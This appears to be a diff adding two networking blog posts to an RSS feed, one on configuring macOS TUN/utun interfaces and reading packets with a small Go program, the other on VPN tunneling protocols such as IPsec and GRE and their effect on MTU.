+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- Display details of all interfaces, including disabled interfaces:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ifconfig -a
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- Disable eth0 interface:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ifconfig eth0 down
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- Enable eth0 interface:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ifconfig eth0 up
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- Assign IP address to eth0 interface:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ifconfig eth0 ip_address
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For example, if you have two machines, one we label &amp;ldquo;local&amp;rdquo; with a LAN IP address like 192.168.0.12 and another we label &amp;ldquo;remote&amp;rdquo; with a LAN IP address like 192.168.1.14, you can assign tunnel IP addresses thusly:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ifconfig tun0 inet 10.0.0.1 10.0.0.2 up
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;on the local system, and:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ifconfig tun0 inet 10.0.0.2 10.0.0.1 up
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;on the remote system. Note the reversed perspective on the remote machine. Do not set your point to point addresses to anything on an existing subnet; it will not route properly.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Note, if you set a wrong interface, you can cancle it with  &lt;code&gt;sudo ifconfig utun2 delete 10.1.0.10 10.1.0.20 &lt;/code&gt; or &lt;code&gt;ifconfig en1 delete 192.168.141.99&lt;/code&gt; for differnt types of network interfaces.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Source: &lt;a href=&#34;https://stackoverflow.com/a/17511998/16317008&#34;&gt;https://stackoverflow.com/a/17511998/16317008&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-use-tun-capture-ip-packets-with-go-on-macos&#34;&gt;4. Use TUN capture ip packets with Go on MacOS&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;go get -u github.com/songgao/water
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;ifce&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;water&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;New&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;water&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Config&lt;/span&gt;{&lt;span style=&#34;color:#a6e22e&#34;&gt;DeviceType&lt;/span&gt;: &lt;span style=&#34;color:#a6e22e&#34;&gt;water&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;TUN&lt;/span&gt;})
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Interface Name: %s\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;ifce&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Name&lt;/span&gt;())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;packet&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make([]&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1500&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ifce&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Read&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;packet&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatal&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Packet Received: % x\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;packet&lt;/span&gt;[:&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# NOTE: replace utunx with the name printed on your go code above&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo ifconfig utun5 10.1.0.10 10.1.0.20 up
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ping -c &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 10.1.0.20
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If no data printed on your go codes, restart your go codes and change a pair of ip addresses for utun interface.&lt;/p&gt;
+&lt;p&gt;Learn more:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/songgao/water&#34;&gt;songgao/water: A simple TUN/TAP library written in native Go.&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://davidzhu.xyz/post/cs-basics/011-tun-device/&#34;&gt;TUN Device &amp;amp; utun Interface&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Tunneling Protocols</title>
+      <link>https://blog.jiyi27.com/posts/networking/007-tunneling-protocols/</link>
+      <pubDate>Sun, 10 Sep 2023 08:27:59 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/007-tunneling-protocols/</guid>
+      <description>&lt;h2 id=&#34;1-vpn&#34;&gt;1. VPN&lt;/h2&gt;
+&lt;p&gt;VPN（Virtual Private Network）的核心特性之一就是使用隧道协议（Tunneling Protocol）。通过这些隧道协议，VPN 能够保证数据在不安全的网络中的安全传输，使得VPN在保护在线隐私和绕过网络限制方面非常有效。&lt;/p&gt;
+&lt;p&gt;常见的隧道协议包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;IPsec (Internet Protocol Security)&lt;/strong&gt;：用于在IP通信过程中确保数据的完整性、认证和机密性。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;OpenVPN&lt;/strong&gt;：一个基于SSL/TLS的开源VPN协议，提供高度的安全性和灵活性。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;WireGuard&lt;/strong&gt;：一个较新的协议，旨在提供更高的速度和更先进的加密技术。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SSL/TLS (Secure Sockets Layer/Transport Layer Security)&lt;/strong&gt;：SSL VPN usually connects using a Web browser, whereas an IPSec VPN generally requires client software on the remote system.
+&lt;ul&gt;
+&lt;li&gt;SSL VPN is a component of virtually every Web browser. Any OS that runs a browser is supported.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;OpenVPN 是一个独立的 VPN 协议，它不使用像 PPTP、L2TP 或 IPsec 这样的标准隧道协议。相反，OpenVPN 使用自己的协议，基于 SSL/TLS 来提供加密和安全连接。它是一个开源的软件应用程序，允许创建安全的点对点或站点对站点连接 OpenVPN 的关键特性包括：&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-vpn&#34;&gt;1. VPN&lt;/h2&gt;
+&lt;p&gt;VPN（Virtual Private Network）的核心特性之一就是使用隧道协议（Tunneling Protocol）。通过这些隧道协议，VPN 能够保证数据在不安全的网络中的安全传输，使得VPN在保护在线隐私和绕过网络限制方面非常有效。&lt;/p&gt;
+&lt;p&gt;常见的隧道协议包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;IPsec (Internet Protocol Security)&lt;/strong&gt;：用于在IP通信过程中确保数据的完整性、认证和机密性。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;OpenVPN&lt;/strong&gt;：一个基于SSL/TLS的开源VPN协议，提供高度的安全性和灵活性。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;WireGuard&lt;/strong&gt;：一个较新的协议，旨在提供更高的速度和更先进的加密技术。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;SSL/TLS (Secure Sockets Layer/Transport Layer Security)&lt;/strong&gt;：SSL VPN usually connects using a Web browser, whereas an IPSec VPN generally requires client software on the remote system.
+&lt;ul&gt;
+&lt;li&gt;SSL VPN is a component of virtually every Web browser. Any OS that runs a browser is supported.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;OpenVPN 是一个独立的 VPN 协议，它不使用像 PPTP、L2TP 或 IPsec 这样的标准隧道协议。相反，OpenVPN 使用自己的协议，基于 SSL/TLS 来提供加密和安全连接。它是一个开源的软件应用程序，允许创建安全的点对点或站点对站点连接 OpenVPN 的关键特性包括：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;自定义加密协议&lt;/strong&gt;：虽然基于 SSL/TLS，但 OpenVPN 有其独特的实现方式，允许高度的定制和灵活性。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;身份验证&lt;/strong&gt;：支持各种认证机制，包括证书、预共享密钥和用户认证。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;跨平台兼容性&lt;/strong&gt;：OpenVPN 可以在多种操作系统上运行，包括 Windows、macOS、Linux 和移动平台。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;2-tunneling&#34;&gt;2. Tunneling&lt;/h2&gt;
+&lt;p&gt;In &lt;a href=&#34;https://davidzhu.xyz/post/networking/007-tun-tap-device/&#34;&gt;previous post&lt;/a&gt;, we know that &lt;em&gt;&lt;strong&gt;TUN&lt;/strong&gt;&lt;/em&gt; and &lt;em&gt;&lt;strong&gt;TAP&lt;/strong&gt;&lt;/em&gt; are two different kernel virtual network devices, which are used for &lt;strong&gt;tunneling&lt;/strong&gt; purposes. In this post, we&amp;rsquo;ll discuss what is tunneling and coomon tunneling protocols.&lt;/p&gt;
+&lt;p&gt;In the physical world, tunneling is a way to cross terrain or boundaries that could not normally be crossed. Similarly, in networking, tunnels are a method for transporting data across a network using protocols that are not supported by that network. &lt;strong&gt;Tunneling works by encapsulating packets: wrapping packets inside of other packets.&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Encapsulating packets within other packets is called &amp;ldquo;tunneling.&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Because tunneling involves repackaging the traffic data into a different form, perhaps with encryption as standard, it can hide the nature of the traffic that is run through a tunnel.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Encapsulation:&lt;/p&gt;
+&lt;p&gt;Data traveling over a network is divided into packets. A typical packet has two parts: the &lt;strong&gt;header&lt;/strong&gt;, which indicates the packet&amp;rsquo;s destination and which protocol it uses, and the &lt;strong&gt;payload&lt;/strong&gt;, which is the packet&amp;rsquo;s actual contents.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;An encapsulated packet is essentially a packet inside another packet&lt;/strong&gt;. In an encapsulated packet, the header and payload of the first packet goes inside the payload section of the surrounding packet. &lt;strong&gt;The original packet itself becomes the payload.&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A VPN just uses one of the tunneling protocols, therefore, when you know how each tunneling protocol works, you will know the essence of VPN of that type.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;3-types-of-tunneling-protocol&#34;&gt;3. Types of Tunneling protocol&lt;/h2&gt;
+&lt;p&gt;In addition to &lt;strong&gt;GRE, IPsec, IP-in-IP, and SSH&lt;/strong&gt;, other tunneling protocols include:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Point-to-Point Tunneling Protocol (PPTP)&lt;/li&gt;
+&lt;li&gt;Secure Socket Tunneling Protocol (SSTP)&lt;/li&gt;
+&lt;li&gt;Layer 2 Tunneling Protocol (L2TP)&lt;/li&gt;
+&lt;li&gt;Virtual Extensible Local Area Network (VXLAN)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;4-ipsec---network-layer&#34;&gt;4. IPsec - Network layer&lt;/h2&gt;
+&lt;p&gt;The IPsec protocol suite operates at the &lt;strong&gt;network layer&lt;/strong&gt; of the OSI model. Within the term &amp;ldquo;IPsec,&amp;rdquo; &amp;ldquo;IP&amp;rdquo; stands for &amp;ldquo;&lt;strong&gt;Internet Protocol&lt;/strong&gt;&amp;rdquo; and &amp;ldquo;sec&amp;rdquo; for &amp;ldquo;secure.&amp;rdquo;  IPsec usually uses port 500.&lt;/p&gt;
+&lt;p&gt;The Internet Protocol is the main routing protocol used on the Internet; it designates where data will go using &lt;a href=&#34;https://www.cloudflare.com/learning/dns/glossary/what-is-my-ip-address/&#34;&gt;IP addresses&lt;/a&gt;. IPsec is secure because it &lt;strong&gt;adds encryption and authentication&lt;/strong&gt; to this process.&lt;/p&gt;
+&lt;h3 id=&#34;41-why-ipsec-is-important&#34;&gt;4.1. Why IPSec is important?&lt;/h3&gt;
+&lt;p&gt;Networking protocol suites like &lt;strong&gt;TCP/IP are only concerned with connection and delivery&lt;/strong&gt;, and messages sent are not concealed. Anyone in the middle can read them. IPsec, and other protocols that encrypt data, essentially put an envelope around data as it traverses networks, keeping it secure.&lt;/p&gt;
+&lt;h3 id=&#34;42-how-does-ipsec-work&#34;&gt;4.2. How does IPsec work?&lt;/h3&gt;
+&lt;p&gt;IPsec connections include the following steps:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Key exchange:&lt;/strong&gt; &lt;a href=&#34;https://www.cloudflare.com/learning/ssl/what-is-a-cryptographic-key/&#34;&gt;Keys&lt;/a&gt; are necessary for encryption;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Packet headers and trailers:&lt;/strong&gt; IP packets contain both a payload and a header. IPsec adds several headers to data packets containing authentication and encryption information. IPsec also adds trailers, which go after each packet&amp;rsquo;s payload instead of before.&lt;/p&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://www.cloudflare.com/learning/network-layer/what-is-ipsec/&#34;&gt;What is IPsec? | How IPsec VPNs work | Cloudflare&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;43-ipsec-tunnel-and-ipsec-transport-mode&#34;&gt;4.3. IPsec tunnel and IPsec transport mode&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Tunnel Mode&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在隧道模式下，IPsec对整个IP数据包（包括头部信息）进行加密。&lt;/li&gt;
+&lt;li&gt;这意味着原始的IP数据包被封装在一个新的IP数据包中。新的数据包有一个新的IP头部。&lt;/li&gt;
+&lt;li&gt;隧道模式常用于VPN（Virtual Private Network，虚拟私人网络），允许不同网络之间安全地传输数据。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Transport Mode&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在传输模式下，IPsec只加密IP数据包的有效载荷（Payload），而不加密头部信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;44-what-protocols-are-used-in-ipsec&#34;&gt;4.4. What protocols are used in IPsec?&lt;/h3&gt;
+&lt;p&gt;In &lt;a href=&#34;https://www.cloudflare.com/learning/network-layer/what-is-the-network-layer/&#34;&gt;networking&lt;/a&gt;, a protocol is a specified way of formatting data so that any networked computer can interpret the data. &lt;strong&gt;IPsec is not one protocol, but a suite of protocols&lt;/strong&gt;. The following protocols make up the IPsec suite:&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Authentication Header (AH):&lt;/strong&gt; The AH protocol ensures that data packets are from a trusted source and that the data has not been tampered with, like a tamper-proof seal on a consumer product. These headers do not provide any encryption; they do not help conceal the data from attackers.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Encapsulating Security Protocol (ESP):&lt;/strong&gt; ESP encrypts the IP header and the payload for each packet — unless transport mode is used, in which case it only encrypts the payload. ESP adds its own header and a trailer to each data packet.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Security Association (SA):&lt;/strong&gt; SA refers to a number of protocols used for negotiating encryption keys and algorithms. One of the most common SA protocols is Internet Key Exchange (IKE).&lt;/p&gt;
+&lt;p&gt;Finally, while the &lt;strong&gt;Internet Protocol (IP)&lt;/strong&gt; is not part of the IPsec suite, IPsec runs directly on top of IP.&lt;/p&gt;
+&lt;h3 id=&#34;45-how-does-ipsec-impact-mss-and-mtu&#34;&gt;4.5. How does IPsec impact MSS and MTU?&lt;/h3&gt;
+&lt;p&gt;IPsec protocols add several headers and trailers to packets, all of which take up several bytes. For networks that use IPsec, either the MSS and MTU have to be adjusted accordingly, or packets will be fragmented and slightly delayed. Usually, the MTU for a network is 1,500 bytes. A normal IP header is 20 bytes long, and a TCP header is also 20 bytes long, meaning each packet can contain 1,460 bytes of payload. However, &lt;strong&gt;IPsec adds an Authentication Header, an ESP header, and associated trailers&lt;/strong&gt;. These add 50-60 bytes to a packet, or more.&lt;/p&gt;
+&lt;h2 id=&#34;5-gre---network-layer&#34;&gt;5. GRE - Network Layer&lt;/h2&gt;
+&lt;p&gt;Encapsulating packets within other packets is called &amp;ldquo;tunneling.&amp;rdquo; GRE tunnels are usually configured between two routers, with each router acting like one end of the tunnel. The routers are set up to send and receive GRE packets directly to each other. &lt;strong&gt;Any routers in between those two routers&lt;/strong&gt; will not open the encapsulated packets; they only reference the headers surrounding the encapsulated packets in order to forward them.&lt;/p&gt;
+&lt;p&gt;GRE enables the usage of protocols that are not normally supported by a network, because the packets are wrapped within other packets that do use supported protocols. To understand how this works, think about the difference between a &lt;strong&gt;car&lt;/strong&gt; and a &lt;strong&gt;ferry&lt;/strong&gt;. A &lt;strong&gt;car&lt;/strong&gt; travels over roads on land, while a &lt;strong&gt;ferry&lt;/strong&gt; travels over &lt;strong&gt;water&lt;/strong&gt;. A &lt;strong&gt;car&lt;/strong&gt; cannot normally travel on &lt;strong&gt;water&lt;/strong&gt; — however, a &lt;strong&gt;car&lt;/strong&gt; can be loaded onto a &lt;strong&gt;ferry&lt;/strong&gt; in order to do so.&lt;/p&gt;
+&lt;p&gt;For instance, suppose a company needs to set up a connection between the &lt;a href=&#34;https://www.cloudflare.com/learning/network-layer/what-is-a-lan/&#34;&gt;local area networks (LANs)&lt;/a&gt; in their two different offices. Both LANs use the latest version of the &lt;a href=&#34;https://www.cloudflare.com/learning/network-layer/internet-protocol/&#34;&gt;Internet Protocol&lt;/a&gt;, IPv6. But in order to get from one office network to another, traffic must pass through a network managed by a third party — which is somewhat outdated and only supports the older IPv4 protocol.&lt;/p&gt;
+&lt;p&gt;With GRE, the company could send traffic through this network by encapsulating IPv6 packets within IPv4 packets. Referring back to the analogy, the &lt;strong&gt;IPv6 packets are the car&lt;/strong&gt;, the IPv4 packets are the ferry, and the &lt;strong&gt;third-party network is the water&lt;/strong&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;51-what-goes-in-a-gre-header&#34;&gt;5.1. What goes in a GRE header?&lt;/h3&gt;
+&lt;p&gt;GRE adds two headers to each packet: the GRE header, which is 4 bytes long, and an IP header, which is 20 bytes long. The GRE header indicates the protocol type used by the encapsulated packet. The IP header encapsulates the original packet&amp;rsquo;s header and payload. This means that a GRE packet usually has two IP headers: one for the original packet, and one added by the GRE protocol. Only the routers at each end of the GRE tunnel will reference the original, non-GRE IP header.&lt;/p&gt;
+&lt;h3 id=&#34;52-how-does-the-use-of-gre-impact-mtu-and-mss-requirements&#34;&gt;5.2. How does the use of GRE impact MTU and MSS requirements?&lt;/h3&gt;
+&lt;p&gt;Like any protocol, using GRE adds a few bytes to the size of data packets. This must be factored into the MSS and MTU settings for packets. If the MTU is 1,500 bytes and the MSS is 1,460 bytes (to account for the size of the necessary IP and &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/tcp-ip/&#34;&gt;TCP&lt;/a&gt; headers), the addition of GRE 24-byte headers will cause the packets to exceed the MTU:&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;1,460 bytes [payload] + 20 bytes [TCP header] + 20 bytes [IP header] + 24 bytes [GRE header + IP header] = 1,524 bytes&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;As a result, the packets will be fragmented. Fragmentation slows down packet delivery times and increases how much compute power is used, because packets that exceed the MTU must be broken down and then reassembled.&lt;/p&gt;
+&lt;p&gt;This can be avoided by reducing the MSS to accommodate the GRE headers. If the MSS is set to 1,436 instead of 1,460, the GRE headers will be accounted for and the packets will not exceed the MTU of 1,500:&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;1,436 bytes [payload] + 20 bytes [TCP header] + 20 bytes [IP header] + 24 bytes [GRE header + IP header] = 1,500 bytes&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;While fragmentation is avoided, the result is that payloads are slightly smaller, meaning it will take extra packets to deliver data. For instance, if the goal is to deliver 150,000 bytes of content (or about 150 kB), and if the MTU is set to 1,500 and no other layer 3 protocols are used, compare how many packets are necessary when GRE is used versus when it is not used:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Without GRE, MSS 1,460: &lt;strong&gt;103&lt;/strong&gt; packets&lt;/li&gt;
+&lt;li&gt;With GRE, MSS 1,436: &lt;strong&gt;105&lt;/strong&gt; packets&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The extra two packets add milliseconds of delay to the data transfer. However, the usage of GRE may allow these packets to take faster network paths than they could otherwise take, which can make up for the lost time.&lt;/p&gt;
+&lt;h2 id=&#34;6-ssh-tunneling----application-layer&#34;&gt;6. SSH Tunneling  - Application layer&lt;/h2&gt;
+&lt;p&gt;The Secure Shell (SSH) protocol sets up encrypted connections between client and server, and can also be used to set up a secure tunnel. SSH operates at layer 7 of the OSI model, the application layer. By contrast, IPsec, IP-in-IP, and GRE operate at the network layer.&lt;/p&gt;
